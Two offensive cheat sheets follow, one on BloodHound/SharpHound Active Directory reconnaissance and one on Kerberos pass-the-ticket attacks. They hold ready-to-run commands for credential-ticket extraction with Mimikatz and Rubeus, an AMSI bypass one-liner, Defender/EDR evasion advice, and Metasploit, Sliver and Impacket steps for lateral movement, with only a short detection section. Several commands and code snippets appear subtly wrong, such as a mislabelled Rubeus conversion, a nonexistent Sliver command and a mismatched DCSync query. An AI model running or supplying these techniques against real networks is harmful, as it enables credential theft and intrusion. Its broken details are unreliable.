
### **BloodHound & SharpHound Cheat Sheet**

BloodHound and SharpHound are powerful tools used to analyze Active Directory (AD) environments and discover attack paths. Here's a cheat sheet on using these tools effectively, including evasion techniques and integration with Metasploit and Sliver.

---

### **1. BloodHound Overview**

- **BloodHound**: A tool that visualizes AD attack paths. It uses graph theory to reveal the shortest path an attacker might take to reach high-privilege accounts.

- **SharpHound**: The data collection tool used by BloodHound. It collects information about the AD environment and outputs data that BloodHound can analyze.

---

### **2. Basic BloodHound & SharpHound Workflow**

1. **Deploy SharpHound** to collect data from the AD environment.
   ```bash
   SharpHound.exe -c All
   ```

2. **Ingest the data** collected by SharpHound into BloodHound.
   - Use the BloodHound GUI to upload the JSON files created by SharpHound.

3. **Analyze the data** using the BloodHound interface.
   - Identify attack paths, high-value targets, and potential lateral movement strategies.

---

### **3. Common SharpHound Collection Methods**

- **All Data Collection**:
  ```bash
  SharpHound.exe -c All
  ```

- **Session Collection**:
  ```bash
  SharpHound.exe -c Session
  ```

- **Group Membership Collection**:
  ```bash
  SharpHound.exe -c Group
  ```

- **ACL Collection**:
  ```bash
  SharpHound.exe -c ACL
  ```

- **Custom Collection**:
  ```bash
  SharpHound.exe -c "ObjectProps,Group,Trusts,ACL,Container,SPNTargets,GPOLocalGroup,Session,LoggedOn"
  ```

- **Domain Admins Path Collection**:
  ```bash
  SharpHound.exe -c DCOM,PSRemote,ACL,Trusts,SPNTargets -d DOMAIN -p BloodHound
  ```

---

### **4. Evasion Techniques**

#### **Bypass AMSI:**
- **AMSI** (Antimalware Scan Interface) can detect and block SharpHound. To bypass it:
  - Use obfuscated or custom binaries of SharpHound.
  - Use AMSI bypass techniques before executing SharpHound.

- **Example of AMSI Bypass in PowerShell**:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

#### **Evade Defender/EDR:**
- Use SharpHound with **obfuscated signatures**.
- **Rename SharpHound** executables to avoid signature-based detection.
- Use **reflective loaders** to execute SharpHound in-memory without writing to disk.
- Utilize **packing tools** or **custom crypters** to avoid detection.

#### **In-Memory Execution:**
- Use **Cobalt Strike**, **Metasploit**, or **Sliver** to inject SharpHound directly into memory.

---

### **5. Using SharpHound with Metasploit & Sliver**

#### **Metasploit Integration:**
- **Upload SharpHound via Metasploit**:
  ```bash
  upload /path/to/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe
  ```
- **Execute SharpHound**:
  ```bash
  execute -f C:\\Windows\\Temp\\SharpHound.exe -c All
  ```
- **Download the results**:
  ```bash
  download C:\\Windows\\Temp\\*.zip /local/path
  ```

#### **Sliver Integration:**
- **SharpHound in Sliver**:
  - Generate a payload that can execute SharpHound in memory using Sliver's `execute-assembly` command.

  ```bash
  sliver > execute-assembly /path/to/SharpHound.exe -c All
  ```

- **Sliver AMSI Bypass**:
  - Use AMSI bypass techniques before executing SharpHound in Sliver.

  ```bash
  sliver > psiexec -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
  ```

---

### **6. Advanced Techniques**

- **SharpHound with Cobalt Strike**:
  - Use **execute-assembly** to run SharpHound directly in memory.
  ```bash
  execute-assembly /path/to/SharpHound.exe -c All
  ```

- **Custom C2 Profiles**:
  - Modify C2 profiles to reduce the likelihood of detection when executing BloodHound-related tasks.

- **Obfuscation**:
  - Obfuscate the SharpHound binary using tools like `ConfuserEx` or custom obfuscators to evade detection.

---

### **7. Detection and Mitigation**

- **Detection**:
  - Monitor for large numbers of LDAP queries, which are common during SharpHound data collection.
  - Watch for unusual Kerberos ticket requests or DCOM execution.

- **Mitigation**:
  - Limit unnecessary delegation and administrative privileges.
  - Implement stringent network segmentation and monitoring.
  - Regularly audit AD permissions and clean up stale accounts.

---

### **8. BloodHound Queries (Cypher) Examples**

- **Find Domain Admins**:
  ```cypher
  MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.name = "DOMAIN ADMINS@DOMAIN.LOCAL" RETURN n.name
  ```

- **Find Paths to Domain Admin**:
  ```cypher
  MATCH p=shortestPath((n:User {name:"lowprivuser@DOMAIN.LOCAL"})-[r*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
  ```

- **Find Users with SPN (Service Principal Name)**:
  ```cypher
  MATCH (u:User) WHERE u.hasspn = true RETURN u.name
  ```

- **Identify Users with DCSync Rights**:
  ```cypher
  MATCH (c:User {name:"DOMAIN\\Administrator"})-[r:AllowedToAct]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name, r
  ```

---

This cheat sheet provides essential commands and strategies for using BloodHound and SharpHound effectively, including tips for evading AMSI, Defender, and EDR solutions, and how to integrate these tools with Metasploit and Sliver.

Passing the ticket (PtT) is a post-exploitation technique that allows an attacker to use Kerberos tickets (particularly TGTs or service tickets) extracted from one machine to authenticate as the ticket’s owner on another system, without knowing the actual password of the associated account. Here’s a cheat sheet of common methods using various tools and custom code.

### **1. Mimikatz (Windows)**
Mimikatz is the most popular tool for pass-the-ticket attacks.

#### **Extracting and Passing Tickets:**
- **Extract TGT**:
  ```powershell
  .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
  ```
  This command extracts the tickets from memory and saves them as `.kirbi` files.

- **Inject a Ticket**:
  ```powershell
  .\mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"
  ```
  This command loads the extracted ticket into the current session.

- **Pass the Ticket**:
  Once the ticket is loaded, you can use it with tools like `PsExec`, `WMIC`, or RDP.

### **2. Rubeus (Windows)**
Rubeus is a C# toolset for interacting with Kerberos tickets.

#### **Extracting and Passing Tickets:**
- **Extract TGT**:
  ```powershell
  Rubeus.exe dump /luid:0x12345678
  ```
  This command extracts TGTs from memory, with the `/luid` parameter specifying a particular LUID.

- **Pass the Ticket**:
  ```powershell
  Rubeus.exe ptt /ticket:base64_ticket_data
  ```
  Use this command to inject a base64-encoded `.kirbi` ticket into the current session.

- **Converting `.kirbi` to CCache**:
  ```powershell
  Rubeus.exe tgtdeleg /ticket:ticket.kirbi /outfile:ticket.ccache
  ```
  This command converts a `.kirbi` ticket to a Linux-compatible `ccache` format.

### **3. Impacket (Linux/Windows)**
Impacket is a collection of Python scripts for working with network protocols.

#### **Pass the Ticket with `psexec.py`**:
- **Pass the Ticket**:
  ```bash
  export KRB5CCNAME=./ticket.ccache
  python3 psexec.py domain/username@target -k -no-pass
  ```
  This command uses a Kerberos ticket to authenticate with a target system, instead of using a password.

#### **Pass the Ticket with `wmiexec.py`**:
- **Pass the Ticket**:
  ```bash
  export KRB5CCNAME=./ticket.ccache
  python3 wmiexec.py domain/username@target -k -no-pass
  ```
  This allows executing commands on the target system using WMI.

### **4. Custom Code**

#### **PowerShell (Windows)**
- **Loading a Ticket**:
  ```powershell
  [System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes("path\to\Rubeus.exe"))
  Rubeus.Program.Main("ptt /ticket:base64_ticket_data".Split())
  ```
  This script loads a base64-encoded Kerberos ticket into the current session using Rubeus.

#### **Python (Linux/Windows)**
- **Using `impacket` for PtT**:
  ```python
  from impacket.krb5.ccache import CCache
  from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGT
  from impacket.krb5.types import Principal

  ccache = CCache.loadFile('ticket.ccache')
  credentials = ccache.principal.components
  tgt, cipher, sessionKey = getKerberosTGT(credentials)
  ```

- **Passing the Ticket with Kerberos in Python**:
  ```python
  from impacket.krb5.ccache import CCache
  from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGT
  from impacket.krb5.types import Principal

  ccache = CCache.loadFile('ticket.ccache')
  tgt, cipher, sessionKey = getKerberosTGT(ccache.principal)
  ```

#### **C# (Windows)**
- **Rubeus in C#**:
  You can incorporate Rubeus into a C# project to load tickets:
  ```csharp
  // Load a ticket
  byte[] ticketBytes = File.ReadAllBytes("path/to/ticket.kirbi");
  string base64Ticket = Convert.ToBase64String(ticketBytes);
  string[] args = { "ptt", "/ticket:" + base64Ticket };
  Rubeus.Program.Main(args);
  ```

### **5. Leveraging Tickets with Various Tools**

- **Remote Desktop Protocol (RDP)**:
  If you have a valid TGT, you can authenticate to RDP without entering credentials, provided the ticket is loaded correctly.

- **PsExec**:
  Use PsExec to remotely execute commands on a target machine using an injected ticket.

- **SMB and File Shares**:
  Once the ticket is loaded, you can access SMB shares or interact with files on other machines in the domain.

---

### **Evasion Techniques**
- **Use Obfuscated Versions** of tools like Mimikatz, Rubeus, or custom loaders to avoid detection by security tools.
- **In-Memory Execution**: Load and execute tools in memory to prevent them from being written to disk and detected by traditional AV solutions.
- **Command Line Obfuscation**: Hide the true nature of your commands using PowerShell obfuscation techniques or custom encoders.

---

This cheat sheet outlines the common methods of passing the ticket using a variety of tools and custom code. Each tool has its advantages and can be used in different scenarios depending on your operational needs.